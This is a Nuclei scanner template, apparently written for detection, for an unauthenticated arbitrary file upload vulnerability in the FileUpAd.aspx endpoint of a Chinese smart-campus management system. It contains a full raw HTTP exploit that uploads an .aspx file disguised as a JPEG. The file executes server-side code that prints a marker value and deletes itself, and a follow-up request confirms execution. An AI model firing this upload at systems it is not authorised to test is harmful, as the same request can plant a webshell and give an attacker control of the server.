id: zhihuizonghe-FileUpAd-upload
info:
  name: Template Name
  author: wangzong
  severity: critical
  description: 智慧校园(安校易)管理系统 FileUpAd.aspx 接口处存在任意文件上传漏洞，未经身份验证的攻击者通过漏洞上传恶意后门文件，执行任意代码，从而获取到服务器权限。
  reference:
    - http://kpanda.wiki/#/../Vulnhub/Y34-2%E9%93%B6%E8%BE%BE%E4%BA%91%E5%88%9B-%E6%99%BA%E6%85%A7%E6%A0%A1%E5%9B%AD%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0
  tags: tags
http:
  - raw:
      - |
        POST /Module/FileUpPage/FileUpAd.aspx?file_tmid=upload HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
        Accept: application/json, text/javascript, */*; q=0.01
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        X-Requested-With: XMLHttpRequest
        Content-Type: multipart/form-data; boundary=----21909179191068471382830692394
        Connection: close
        Content-Length: 172

        ------21909179191068471382830692394
        Content-Disposition: form-data; name="File"; filename="{{filename}}.aspx"
        Content-Type: image/jpeg

        <%@Page Language="C#"%><% Response.Write(111*111);System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath));%>
        ------21909179191068471382830692394--
      - |
        GET /imgnews/imgad/000000/{{filename}}.aspx HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: or
    matchers:
      - type: word
        part: body
        words:
          - '.aspx'
      - type: word
        part: body
        words:
          - '12321'
